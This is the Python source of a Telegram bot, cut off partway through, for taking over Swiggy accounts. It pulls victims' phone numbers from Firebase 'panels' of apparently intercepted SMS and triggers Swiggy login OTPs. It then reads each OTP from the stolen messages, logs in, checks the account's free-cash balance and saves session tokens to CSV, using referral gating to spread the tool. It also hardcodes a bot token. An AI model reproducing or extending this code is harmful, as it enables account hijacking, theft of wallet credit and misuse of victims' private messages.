#!/usr/bin/env python3
"""
Swiggy TG Bot — Private Panel Per User + Single Number Check
- Flow: /start -> Join Channels -> Share Referral -> Unlock -> Add YOUR Panel -> Scan
- Check Number: enter single phone, bot sends OTP, user types OTP back, shows cash
- Each user uploads and manages their OWN panels only
- 15 workers per user, private aiohttp session
- Admins bypass channel + referral gate
"""

import asyncio
import json
import logging
import os
import re
import sys
import time
import base64
import csv
import random
import uuid
import urllib.parse
import zlib
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Tuple

import aiohttp
import httpx
from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    Update,
)
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from telegram.error import TelegramError

# ── Logging ────────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S",
)
logger = logging.getLogger(__name__)

# ── Config ─────────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8646908060:AAGTZni_boQhI8h4gFBpTh0z2kW0ExDBU34")
ADMIN_IDS = {1446058092, 6894923643}

REQUIRED_CHANNELS = [
    {"username": "blankkdealz", "url": "https://t.me/blankkdealz", "label": "Blank Dealz"},
    {"username": "earnwithsakx", "url": "https://t.me/earnwithsakx", "label": "Earn With Sakx"},
    {"username": "blankdealzzchat", "url": "https://t.me/blankdealzzchat", "label": "Blank Dealz Chat"},
]

DEFAULT_CAMPAIGN_ID = "ougwl_MjU3MTUyNzI0I1JhaHVs"
DEFAULT_SENDER = "SWIGGY"
DEFAULT_THRESHOLD = 190
DEFAULT_WORKERS = 15
OTP_TIMEOUT = 30
POLL_INTERVAL = 0.5
REFERRALS_FOR_1H = 3
ACCESS_HOURS = 1

STATE_FILE = Path(__file__).parent / "bot_state.json"
USERS_FILE = Path(__file__).parent / "users.json"
USER_PANELS_FILE = Path(__file__).parent / "user_panels.json"
RESULTS_DIR = Path(__file__).parent / "results"
RESULTS_DIR.mkdir(exist_ok=True)


# ── JSON helpers ───────────────────────────────────────────────────────────────
def load_json(path, default):
    if path.exists():
        try:
            with open(path, "r") as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Error loading {path}: {e}")
    return default


def save_json(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving {path}: {e}")


def load_state():
    return load_json(STATE_FILE, {})


def save_state(s):
    save_json(STATE_FILE, s)


# ── Per-user panels (PRIVATE) ─────────────────────────────────────────────────
def load_user_panels() -> dict:
    return load_json(USER_PANELS_FILE, {})


def save_user_panels(data: dict):
    save_json(USER_PANELS_FILE, data)


def get_user_panels(uid: int) -> dict:
    all_panels = load_user_panels()
    return all_panels.get(str(uid), {})


def add_user_panel(uid: int, panel_data: dict) -> str:
    all_panels = load_user_panels()
    uid_str = str(uid)
    if uid_str not in all_panels:
        all_panels[uid_str] = {}
    pid = f"p_{int(time.time())}_{len(all_panels[uid_str])}"
    all_panels[uid_str][pid] = panel_data
    save_user_panels(all_panels)
    return pid


def remove_user_panel(uid: int, panel_id: str) -> bool:
    all_panels = load_user_panels()
    uid_str = str(uid)
    if uid_str in all_panels and panel_id in all_panels[uid_str]:
        del all_panels[uid_str][panel_id]
        save_user_panels(all_panels)
        return True
    return False


# ── User management ────────────────────────────────────────────────────────────
def load_users() -> dict:
    return load_json(USERS_FILE, {})


def save_users(u: dict):
    save_json(USERS_FILE, u)


def get_user(uid: int) -> dict | None:
    return load_users().get(str(uid))


def upsert_user(uid: int, **kwargs):
    users = load_users()
    key = str(uid)
    if key not in users:
        users[key] = {
            "username": "",
            "access_expiry": 0,
            "referrals_given": 0,
            "referred_by": None,
            "joined_at": int(time.time()),
        }
    users[key].update(kwargs)
    save_users(users)
    return users[key]


def has_access(uid: int) -> bool:
    if uid in ADMIN_IDS:
        return True
    u = get_user(uid)
    if not u:
        return False
    return u.get("access_expiry", 0) > time.time()


def grant_access_hours(uid: int, hours: int = ACCESS_HOURS) -> float:
    u = get_user(uid)
    now = time.time()
    current_expiry = u.get("access_expiry", now) if u else now
    new_expiry = max(current_expiry, now) + hours * 3600
    upsert_user(uid, access_expiry=new_expiry)
    return new_expiry


def get_all_user_ids() -> list[int]:
    return [int(k) for k in load_users().keys()]


# ── Channel membership ─────────────────────────────────────────────────────────
async def check_channels(bot, uid: int) -> list[dict]:
    not_joined = []
    for ch in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(f"@{ch['username']}", uid)
            if member.status in ("left", "kicked", "banned"):
                not_joined.append(ch)
        except TelegramError:
            not_joined.append(ch)
    return not_joined


def channel_join_keyboard(not_joined: list[dict]) -> InlineKeyboardMarkup:
    buttons = [[InlineKeyboardButton(ch["label"], url=ch["url"])] for ch in not_joined]
    buttons.append([InlineKeyboardButton("I've Joined - Check", callback_data="check_join")])
    return InlineKeyboardMarkup(buttons)


# ── Per-User Session Manager ───────────────────────────────────────────────────
class UserSession:
    def __init__(self, uid: int):
        self.uid = uid
        self.semaphore = asyncio.Semaphore(DEFAULT_WORKERS)
        self.session: Optional[aiohttp.ClientSession] = None
        self.running_tasks: Dict[str, asyncio.Task] = {}
        self.results: List[dict] = []
        self.total_scanned = 0
        self.total_found = 0
        self.is_running = False

    async def get_session(self) -> aiohttp.ClientSession:
        if self.session is None or self.session.closed:
            connector = aiohttp.TCPConnector(limit=0, force_close=False)
            self.session = aiohttp.ClientSession(connector=connector)
        return self.session

    async def close(self):
        for task in self.running_tasks.values():
            task.cancel()
        self.running_tasks.clear()
        if self.session and not self.session.closed:
            await self.session.close()
        self.session = None
        self.is_running = False

    def reset_results(self):
        self.results = []
        self.total_scanned = 0
        self.total_found = 0


class SessionManager:
    def __init__(self):
        self._sessions: Dict[int, UserSession] = {}

    async def get(self, uid: int) -> UserSession:
        if uid not in self._sessions:
            self._sessions[uid] = UserSession(uid)
        return self._sessions[uid]

    async def remove(self, uid: int):
        if uid in self._sessions:
            await self._sessions[uid].close()
            del self._sessions[uid]

    async def close_all(self):
        for us in list(self._sessions.values()):
            await us.close()
        self._sessions.clear()


session_manager = SessionManager()


# ── Swiggy API Helpers ─────────────────────────────────────────────────────────
def generate_csrf() -> str:
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return "".join(random.choices(chars, k=40))


def generate_uuid() -> str:
    return str(uuid.uuid4())


def random_user_agent() -> str:
    return (
        "Mozilla/5.0 (Linux; Android 14; SM-A065F Build/UP1A.231005.007; wv) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
        "Chrome/150.0.7871.181 Mobile Safari/537.36"
    )


# ── Firebase URL Normalization ─────────────────────────────────────────────────
def _normalize_firebase_url(url: str, key: str = "") -> tuple:
    url = url.strip().rstrip("/")
    if url.startswith("http"):
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        if not key:
            for k, v in qs.items():
                if k.lower() in ("key", "auth", "secret", "token"):
                    key = v[0]
                    break
        api_url = (parsed.scheme + "://" + parsed.netloc + parsed.path).rstrip("/")
        if key.startswith("http"):
            key = ""
        return api_url, key
    else:
        if url.endswith("-default-rtdb"):
            return f"https://{url}.firebaseio.com", key
        elif ".firebaseio.com" in url or ".firebasedatabase.app" in url:
            return f"https://{url}", key
        else:
            return f"https://{url}-default-rtdb.firebaseio.com", key


def decode_merge_panels(panel_url: str) -> list:
    parsed = urllib.parse.urlparse(panel_url)
    fragment = parsed.fragment
    if not fragment.startswith("merge="):
        return []
    b64 = fragment[6:]
    b64_padded = b64 + "=" * ((4 - len(b64) % 4) % 4)
    try:
        raw = base64.b64decode(b64_padded)
    except Exception:
        return []
    decoded = ""
    try:
        decoded = zlib.decompress(raw, -15).decode("utf-8")
    except Exception:
        pass
    if not decoded:
        try:
            decoded = raw.decode("latin-1")
        except Exception:
            pass
    if not decoded:
        return []
    panels = []
    try:
        stripped = decoded.strip()
        if stripped.startswith("["):
            shared = json.loads(stripped)
            for item in shared:
                u = item.get("url", "") or item.get("u", "")
                k = item.get("key", "") or item.get("k", "")
                if u:
                    panels.append(_normalize_firebase_url(u, k))
        else:
            for part in stripped.split(","):
                part = part.strip()
                if not part:
                    continue
                segments = part.split("|", 1)
                u = segments[0].strip()
                k = segments[1].strip() if len(segments) > 1 else ""
                if u:
                    panels.append(_normalize_firebase_url(u, k))
    except Exception as e:
        logger.error(f"decode_merge_panels parse error: {e}")
    return panels


def get_panel_api_url(panel_url: str):
    parsed_pre = urllib.parse.urlparse(panel_url)
    if parsed_pre.fragment.startswith("merge="):
        panels = decode_merge_panels(panel_url)
        if panels:
            return panels[0]
        return None, None

    panel_url_clean = panel_url.split("#")[0]
    parsed = urllib.parse.urlparse(panel_url_clean)
    qs = urllib.parse.parse_qs(parsed.query)

    s_param = qs.get("s", [""])[0]
    if s_param:
        s_param_padded = s_param + "=" * ((4 - len(s_param) % 4) % 4)
        try:
            decoded = base64.b64decode(s_param_padded).decode("utf-8")
            for sep in ["|||", "|"]:
                if sep in decoded:
                    parts = decoded.split(sep)
                    if len(parts) >= 2:
                        firebase_url = parts[0].strip()
                        api_key = parts[1].strip()
                        if firebase_url:
                            return firebase_url.rstrip("/"), api_key
        except Exception:
            pass

    if ".firebaseio.com" in panel_url_clean or ".firebasedatabase.app" in panel_url_clean:
        url = panel_url_clean.split("?")[0].split(".json")[0].rstrip("/")
        auth_key = ""
        for k, v in qs.items():
            if k.lower() in ("key", "auth", "secret", "token"):
                auth_key = v[0]
                break
        if auth_key.startswith("http"):
            auth_key = ""
        return url, auth_key

    url = panel_url_clean.split("?")[0].rstrip("/")
    auth_key = ""
    for k, v in qs.items():
        if k.lower() in ("key", "auth", "secret", "token", "apikey", "api_key"):
            auth_key = v[0]
            break
    if auth_key.startswith("http"):
        auth_key = ""
    return url, auth_key


# ── Firebase async helpers ─────────────────────────────────────────────────────
def fb_url(base: str, auth_key: str = "", **extra) -> str:
    params = {}
    if auth_key:
        if auth_key.startswith("http"):
            auth_key = ""
        if auth_key:
            params["auth"] = auth_key
    params.update(extra)
    if not params:
        return base
    sep = "&" if "?" in base else "?"
    return base + sep + "&".join(f"{k}={v}" for k, v in params.items())


async def fb_fetch(client: httpx.AsyncClient, url: str, timeout: int = 10):
    try:
        resp = await client.get(url, timeout=timeout)
        if resp.status_code == 200:
            return resp.json(), None
        return None, f"HTTP {resp.status_code}"
    except Exception as e:
        return None, str(e)


async def fetch_phones_async(
    client: httpx.AsyncClient, api_url: str, auth_key: str, limit: int = 100
) -> List[Tuple[str, str]]:
    if not api_url:
        return []
    base = api_url.rstrip("/") + "/"

    clients_data, _ = await fb_fetch(client, fb_url(f"{base}clients/.json", auth_key))
    if not clients_data or not isinstance(clients_data, dict):
        clients_data, _ = await fb_fetch(client, fb_url(f"{base}devices/.json", auth_key))
    if not clients_data or not isinstance(clients_data, dict):
        return []

    phones = []
    for c_id, c_data in clients_data.items():
        if len(phones) >= limit:
            break
        if not isinstance(c_data, dict):
            continue
        phone = (
            c_data.get("mobNo")
            or c_data.get("phone")
            or c_data.get("mobile")
            or c_data.get("number")
            or c_data.get("phoneNumber")
            or ""
        )
        if phone:
            phone = re.sub(r"\D", "", str(phone))
            if len(phone) == 10 and phone[0] in "6789":
                phones.append((phone, c_id))
                continue
        msgs_data, _ = await fb_fetch(
            client, fb_url(f"{base}messages/{c_id}/.json", auth_key)
        )
        if msgs_data and isinstance(msgs_data, dict):
            for msg in msgs_data.values():
                if not isinstance(msg, dict):
                    continue
                text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
                match = re.search(r"\b([6-9]\d{9})\b", text)
                if match:
                    phones.append((match.group(1), c_id))
                    break
    return phones


# ── OTP Poller (for batch scan with panels) ────────────────────────────────────
async def poll_otp_from_panel(
    firebase_url: str,
    device_id: str,
    sender_keyword: str,
    session: aiohttp.ClientSession,
    api_key: Optional[str] = None,
    timeout: int = OTP_TIMEOUT,
    poll_interval: float = POLL_INTERVAL,
    trigger_time: Optional[int] = None,
) -> Optional[str]:
    if trigger_time is None:
        trigger_time = int(time.time() * 1000)
    start = time.time()
    base_url = firebase_url.rstrip("/") + "/"

    while time.time() - start < timeout:
        try:
            url = f"{base_url}messages/{device_id}.json"
            if api_key:
                url += f"?auth={api_key}"
            async with session.get(
                url, timeout=aiohttp.ClientTimeout(total=5)
            ) as resp:
                if resp.status != 200:
                    await asyncio.sleep(poll_interval)
                    continue
                msgs = await resp.json()
                if not msgs:
                    await asyncio.sleep(poll_interval)
                    continue
                for msg_id in sorted(msgs.keys(), reverse=True):
                    msg_data = msgs[msg_id]
                    if not isinstance(msg_data, dict):
                        continue
                    msg_ts = None
                    for field in [
                        "timestamp", "time", "sentTimestamp",
                        "date", "createdAt", "id",
                    ]:
                        if field in msg_data and msg_data[field]:
                            try:
                                msg_ts = int(msg_data[field])
                                break
                            except (ValueError, TypeError):
                                pass
                    if msg_ts is None:
                        try:
                            msg_ts = int(msg_id)
                        except (ValueError, TypeError):
                            continue
                    if msg_ts < trigger_time - 10000:
                        continue
                    if time.time() * 1000 - msg_ts > 120000:
                        continue
                    sender = msg_data.get("sender", "")
                    if sender_keyword.lower() in sender.lower():
                        body = msg_data.get("body") or msg_data.get("message") or ""
                        otp_match = re.search(r"OTP\s*(\d{4,6})", body, re.IGNORECASE)
                        if otp_match:
                            return otp_match.group(1)
                        fallback = re.search(r"(?<!\d)(\d{4,6})(?!\d)", body)
                        if fallback:
                            return fallback.group(1)
                await asyncio.sleep(poll_interval)
        except asyncio.CancelledError:
            return None
        except Exception:
            await asyncio.sleep(poll_interval)
    return None


# ── Swiggy Client ──────────────────────────────────────────────────────────────
class SwiggyClient:
    def __init__(self, session: aiohttp.ClientSession):
        self.session = session
        self.csrf = generate_csrf()
        self.device_id = generate_uuid()
        self.tid = None
        self.token = None
        self.user_id = None

    def _build_headers(self, extra: dict = None) -> dict:
        headers = {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.swiggy.com",
            "referer": "https://www.swiggy.com/auth",
            "sec-ch-ua": '"Android WebView";v="149", "Chromium";v="149"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": random_user_agent(),
        }
        if extra:
            headers.update(extra)
        return headers

    async def send_otp(self, phone: str) -> bool:
        signin_url = "https://www.swiggy.com/mapi/auth/signin-check"
        signin_data = {
            "mobile": phone,
            "countryCode": "91",
            "countryKey": "IN",
            "_csrf": self.csrf,
        }
        try:
            async with self.session.post(
                signin_url,
                json=signin_data,
                headers=self._build_headers(),
                timeout=aiohttp.ClientTimeout(total=10),
            ) as resp:
                if resp.status != 200:
                    return False
                data = await resp.json()
                if not data.get("data", {}).get("registered", False):
                    return False
        except Exception:
            return False

        otp_url = "https://www.swiggy.com/mapi/auth/sms-otp"
        otp_data = {"mobile": phone, "_csrf": self.csrf}
        try:
            async with self.session.post(
                otp_url,
                json=otp_data,
                headers=self._build_headers(),
                timeout=aiohttp.ClientTimeout(total=10),
            ) as resp:
                return resp.status == 200
        except Exception:
            return False

    async def verify_otp(self, phone: str, otp: str) -> bool:
        verify_url = "https://www.swiggy.com/mapi/auth/otp-verify"
        verify_data = {"otp": otp, "_csrf": self.csrf}
        try:
            async with self.session.post(
                verify_url,
                json=verify_data,
                headers=self._build_headers(),
                timeout=aiohttp.ClientTimeout(total=10),
            ) as resp:
                if resp.status != 200:
                    return False
                data = await resp.json()
                if data.get("statusCode") != 0:
                    return False
                self.token = data.get("data", {}).get("token")
                self.tid = data.get("tid")
                self.user_id = str(data.get("data", {}).get("customer_id"))
                return bool(self.token and self.tid)
        except Exception:
            return False

    async def get_free_cash(self, campaign_id: str) -> Optional[int]:
        if not self.token or not self.tid:
            return None
        url = "https://spns.swiggy.com/api/v1/campaign/rewards"
        headers = {
            "client-id": "portal",
            "tid": self.tid,
            "token": self.token,
            "user-agent": random_user_agent(),
            "content-type": "application/json",
            "accept": "*/*",
            "origin": "https://webviews.swiggy.com",
            "x-requested-with": "in.swiggy.android",
            "referer": "https://webviews.swiggy.com/",
        }
        payload = {
            "generalContext": {"requestContext": {"clientId": "portal_invite"}},
            "campaignRewardRequests": [
                {
                    "campaignType": "CAMPAIGN_TYPE_BUZZ_MONEY_STREAKS",
                    "campaignId": campaign_id,
                    "rollingFreecashParams": {
                        "forceRefresh": True,
                        "requestParams": {
                            "dataRequested": "wallet,connections,transactions",
                            "consumerName": "User",
                            "source": "invite",
                        },
                    },
                }
            ],
        }
        try:
            async with self.session.post(
                url,
                json=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=15),
            ) as resp:
                if resp.status != 200:
                    return None
                data = await resp.json()
                if data.get("statusCode") != 0:
                    return None
                reward_responses = data.get("data", {}).get(
                    "campaignRewardResponses", []
                )
                if not reward_responses:
                    return None
                rewards = reward_responses[0].get("rewards", [])
                for reward in rewards:
                    if reward.get("rewardType") == "REWARD_TYPE_ROLLING_FREECASH":
                        total_str = (
                            reward.get("rollingFreecash", {})
                            .get("totalEarned", {})
                            .get("units", "0")
                        )
                        try:
                            return int(total_str)
                        except (ValueError, TypeError):
                            return 0
                return 0
        except Exception:
            return None


# ── Process one phone (batch scan) ────────────────────────────────────────────
async def process_phone(
    phone: str,
    device_id: str,
    api_url: str,
    auth_key: str,
    sender_keyword: str,
    campaign_id: str,
    threshold: int,
    user_session: UserSession,
    progress_callback=None,
) -> Optional[Dict]:
    async with user_session.semaphore:
        session = await user_session.get_session()
        client = SwiggyClient(session)

        if not await client.send_otp(phone):
            if progress_callback:
                await progress_callback(phone, "OTP failed")
            return None

        trigger_time = int(time.time() * 1000)
        otp = await poll_otp_from_panel(
            firebase_url=api_url,
            device_id=device_id,
            sender_keyword=sender_keyword,
            session=session,
            api_key=auth_key,
            trigger_time=trigger_time,
        )
        if not otp:
            if progress_callback:
                await progress_callback(phone, "OTP timeout")
            return None

        if not await client.verify_otp(phone, otp):
            if progress_callback:
                await progress_callback(phone, "Verify failed")
            return None

        free_cash = await client.get_free_cash(campaign_id)
        user_session.total_scanned += 1

        if free_cash is None:
            if progress_callback:
                await progress_callback(phone, "Cash error")
            return None

        if free_cash >= threshold:
            user_session.total_found += 1
            result = {
                "phone": phone,
                "device": device_id,
                "free_cash": free_cash,
                "user_id": client.user_id,
                "tid": client.tid,
                "token": client.token,
            }
            user_session.results.append(result)
            if progress_callback:
                await progress_callback(phone, f"FOUND {free_cash}")
            return result
        else:
            if progress_callback:
                await progress_callback(phone, f"low {free_cash}")
            return None


# ── Run scraper for a user (batch) ────────────────────────────────────────────
async def run_scraper(
    uid: int,
    app,
    panel_key: str,
    sender_keyword: str,
    campaign_id: str,
    threshold: int,
    phone_limit: int = 100,
):
    us = await session_manager.get(uid)
    if us.is_running:
        return
    us.is_running = True
    us.reset_results()

    my_panels = get_user_panels(uid)
    panel_config = my_panels.get(panel_key)
    if not panel_config:
        try:
            await app.bot.send_message(uid, "Panel not found. It may have been removed.")
        except Exception:
            pass
        us.is_running = False
        return

    api_url = panel_config.get("api_url", "")
    auth_key = panel_config.get("auth_key", "")
    panel_name = panel_config.get("name", "Unknown")

    status_msg = None
    try:
        status_msg = await app.bot.send_message(
            uid,
            f"""Scraper Starting...
Panel: {panel_name}
Threshold: Rs {threshold}
Workers: {DEFAULT_WORKERS}
Fetching phones...""",
        )
    except Exception:
        pass

    phones = []
    async with httpx.AsyncClient() as fb_client:
        phones = await fetch_phones_async(fb_client, api_url, auth_key, limit=phone_limit)

    if not phones:
        try:
            await app.bot.send_message(
                uid, "No phones found in your panel. Check your panel link."
            )
        except Exception:
            pass
        us.is_running = False
        return

    total = len(phones)
    last_update = time.time()

    async def on_progress(phone: str, status: str):
        nonlocal last_update
        now = time.time()
        if now - last_update < 3:
            return
        last_update = now
        try:
            text = (
                f"Scanning...
"
                f"Scanned: {us.total_scanned}/{total}
"
                f"Found: {us.total_found}
"
                f"Last: {phone} -> {status}"
            )
            if status_msg:
                await app.bot.edit_message_text(text, uid, status_msg.message_id)
        except Exception:
            pass

    tasks = [
        process_phone(
            phone, device, api_url, auth_key,
            sender_keyword, campaign_id, threshold, us, on_progress
        )
        for phone, device in phones
    ]

    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    except asyncio.CancelledError:
        pass

    if us.results:
        filename = RESULTS_DIR / f"uid{uid}_{int(time.time())}.csv"
        with open(filename, "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=us.results[0].keys())
            writer.writeheader()
            writer.writerows(us.results)

    lines = [
        f"Scan Complete!",
        f"Total Scanned: {us.total_scanned}",
        f"Found (>=Rs {threshold}): {us.total_found}",
    ]
    if us.results:
        lines.append("")
        lines.append("Good Accounts:")
        for r in us.results[:20]:
            lines.append(f"  {r['phone']} -> Rs {r['free_cash']}")
        if len(us.results) > 20:
            lines.append(f"  ...and {len(us.results) - 20} more")
        lines.append("")
        lines.append("Full results saved to CSV")
    else:
        lines.append("")
        lines.append("No qualifying accounts found")

    try:
        await app.bot.send_message(uid, "
".join(lines))
    except Exception:
        pass

    us.is_running = False


# ── Check Single Number (NEW) ─────────────────────────────────────────────────
async def check_single_number_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 1: Ask user for the phone number."""
    uid = update.effective_user.id

    if uid not in ADMIN_IDS and not has_access(uid):
        await update.message.reply_text("Access expired. Share your referral link to unlock!")
        return

    await update.message.reply_text(
        """Check Single Number

Send the 10-digit phone number you want to check.
Example: 9876543210"""
    )
    context.user_data["awaiting_check_phone"] = True


async def check_single_number_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 2: User sent phone -> send OTP -> ask user to type OTP back."""
    uid = update.effective_user.id
    phone_raw = update.message.text.strip()

    # Clean and validate
    phone = re.sub(r"\D", "", phone_raw)
    if len(phone) != 10 or phone[0] not in "6789":
        await update.message.reply_text(
            "Invalid number. Send a valid 10-digit Indian mobile number (starts with 6-9)."
        )
        return

    # Send OTP via Swiggy
    await update.message.reply_text(f"Sending OTP to {phone}...")

    connector = aiohttp.TCPConnector(limit=0)
    session = aiohttp.ClientSession(connector=connector)
    client = SwiggyClient(session)

    try:
        sent = await client.send_otp(phone)
    except Exception:
        await session.close()
        await update.message.reply_text("Error sending OTP. Try again.")
        context.user_data.pop("awaiting_check_phone", None)
        return

    if not sent:
        await session.close()
        await update.message.reply_text(
            f"""Failed to send OTP to {phone}.
Number may not be registered on Swiggy. Try another number."""
        )
        context.user_data.pop("awaiting_check_phone", None)
        return

    # OTP sent — store state and ask user to type it
    context.user_data["check_phone"] = phone
    context.user_data["check_session"] = session
    context.user_data["check_client"] = client
    context.user_data.pop("awaiting_check_phone", None)
    context.user_data["awaiting_check_otp"] = True

    await update.message.reply_text(
        f"""OTP sent to {phone}!

Check your phone and send the OTP here.
You have 2 minutes before it expires."""
    )

    # Auto-expire after 2 minutes
    async def expire_otp():
        await asyncio.sleep(120)
        if context.user_data.get("awaiting_check_otp"):
            context.user_data.pop("awaiting_check_otp", None)
            context.user_data.pop("check_phone", None)
            stored_client = context.user_data.pop("check_client", None)
            stored_session = context.user_data.pop("check_session", None)
            if stored_session and not stored_session.closed:
                await stored_session.close()
            try:
                await context.bot.send_message(uid, "OTP expired. Use Check Number to try again.")
            except Exception:
                pass

    asyncio.create_task(expire_otp())


async def check_single_number_verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 3: User sent OTP -> verify -> check cash -> show result."""
    uid = update.effective_user.id
    otp_raw = update.message.text.strip()

    # Validate OTP format
    otp = re.sub(r"\D", "", otp_raw)
    if len(otp) < 4 or len(otp) > 6:
        await update.message.reply_text("Invalid OTP. Send the 4-6 digit OTP you received.")
        return

    phone = context.user_data.get("check_phone", "")
    client: SwiggyClient = context.user_data.get("check_client")
    session: aiohttp.ClientSession = context.user_data.get("check_session")

    if not phone or not client or not session:
        await update.message.reply_text("Session expired. Use Check Number to start again.")
        context.user_data.pop("awaiting_check_otp", None)
        return

    # Verify OTP
    await update.message.reply_text("Verifying OTP...")

    try:
        verified = await client.verify_otp(phone, otp)
    except Exception:
        await session.close()
        context.user_data.pop("awaiting_check_otp", None)
        context.user_data.pop("check_phone", None)
        context.user_data.pop("check_client", None)
        context.user_data.pop("check_session", None)
        await update.message.reply_text("Error verifying OTP. Try again.")
        return

    if not verified:
        await update.message.reply_text(
            """OTP verification failed.
Wrong OTP or expired. Use Check Number to try again."""
        )
        # Keep session alive in case they want to retry
        # But clean up the flow state
        context.user_data.pop("awaiting_check_otp", None)
        context.user_data.pop("check_phone", None)
        context.user_data.pop("check_client", None)
        context.user_data.pop("check_session", None)
        if session and not session.closed:
            await session.close()
        return

    # OTP verified — check cash
    await update.message.reply_text("OTP verified! Checking free cash...")

    campaign_id = context.user_data.get("check_campaign", DEFAULT_CAMPAIGN_ID)
    free_cash = await client.get_free_cash(campaign_id)

    # Clean up session
    context.user_data.pop("awaiting_check_otp", None)
    context.user_data.pop("check_phone", None)
    context.user_data.pop("check_client", None)
    context.user_data.pop("check_session", None)
    if session and not session.closed:
        await session.close()

    # Show result
    if free_cash is None:
        await update.message.reply_text(
            f"""Number: {phone}
Could not fetch free cash.
Account may have restrictions."""
        )
    else:
        await update.message.reply_text(
            f"""Number: {phone}
Free Cash: Rs {free_cash}
User ID: {client.user_id or 'N/A'}"""
        )


# ── /start ─────────────────────────────────────────────────────────────────────
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    username = update.effective_user.username or ""
    args = context.args or []

    upsert_user(uid, username=username)

    # Referral handling
    if args and args[0].startswith("r"):
        try:
            referrer_id = int(args[0][1:])
            if referrer_id != uid:
                u = get_user(uid)
                if u and u.get("referred_by") is None:
                    upsert_user(uid, referred_by=referrer_id)
                    ref_data = get_user(referrer_id)
                    if ref_data is not None:
                        old_refs = ref_data.get("referrals_given", 0)
                        new_refs = old_refs + 1
                        upsert_user(referrer_id, referrals_given=new_refs)
                        if new_refs % REFERRALS_FOR_1H == 0:
                            expiry = grant_access_hours(referrer_id, ACCESS_HOURS)
                            exp_str = datetime.fromtimestamp(expiry).strftime(
                                "%H:%M %d/%m"
                            )
                            try:
                                await context.bot.send_message(
                                    referrer_id,
                                    f"""Congratulations!
Your {new_refs} referrals are done!
1 hour access granted!
Expires: {exp_str}""",
                                )
                            except Exception:
                                pass
                        else:
                            remaining = REFERRALS_FOR_1H - (
                                new_refs % REFERRALS_FOR_1H
                            )
                            try:
                                await context.bot.send_message(
                                    referrer_id,
                                    f"""New referral!
Total: {new_refs} | {remaining} more needed for access""",
                                )
                            except Exception:
                                pass
        except (ValueError, IndexError):
            pass

    # Step 1: Check channel join
    if uid not in ADMIN_IDS:
        not_joined = await check_channels(context.bot, uid)
        if not_joined:
            kb = channel_join_keyboard(not_joined)
            await update.message.reply_text(
                """Welcome to Swiggy Scraper Bot!

Step 1: Join these channels first, then you can use the bot:""",
                reply_markup=kb,
            )
            return

    # Step 2: Check access (referral gate)
    if uid not in ADMIN_IDS and not has_access(uid):
        bot_info = await context.bot.get_me()
        ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"
        u = get_user(uid)
        refs = u.get("referrals_given", 0) if u else 0
        needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)

        await update.message.reply_text(
            f"""Channels joined!

Step 2: Share your referral link to unlock the bot.

Your Referral Link:
{ref_link}

Current referrals: {refs}
{needed} more needed = 1 hour access

Every 3 referrals = 1 hour access!
Share and unlock the bot!""",
        )
        return

    # Step 3: Has access — show main menu
    await show_main_menu(update, context)


# ── Main menu ──────────────────────────────────────────────────────────────────
async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    is_admin = uid in ADMIN_IDS

    my_panels = get_user_panels(uid)
    panel_count = len(my_panels)

    bot_info = await context.bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"

    u = get_user(uid)
    refs = u.get("referrals_given", 0) if u else 0
    expiry = u.get("access_expiry", 0) if u else 0

    if is_admin:
        access_str = "Unlimited (Admin)"
    elif expiry > time.time():
        exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m/%Y")
        access_str = f"Active till {exp_str}"
    else:
        needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
        access_str = f"Expired | {needed} more refer needed"

    keyboard = ReplyKeyboardMarkup(
        [
            ["Start Scan", "Stop Scan"],
            ["Check Number"],
            ["Add My Panel", "Remove My Panel"],
            ["My Panels", "My Status"],
            ["My Referral", "My Access"],
        ],
        resize_keyboard=True,
    )

    role = "Admin" if is_admin else "Member"

    await update.effective_message.reply_text(
        f"""Swiggy Scraper Bot
====================
Role: {role}
Access: {access_str}
Your Panels: {panel_count}
Referrals: {refs}
====================
Your panels are PRIVATE - nobody else can see or use them.

Referral: {ref_link}""",
        reply_markup=keyboard,
    )


# ── Check join callback ────────────────────────────────────────────────────────
async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    not_joined = await check_channels(context.bot, uid)
    if not_joined:
        kb = channel_join_keyboard(not_joined)
        await query.edit_message_text(
            "Still not joined all channels:",
            reply_markup=kb,
        )
    else:
        if uid not in ADMIN_IDS and not has_access(uid):
            bot_info = await context.bot.get_me()
            ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"
            u = get_user(uid)
            refs = u.get("referrals_given", 0) if u else 0
            needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)

            await query.edit_message_text(
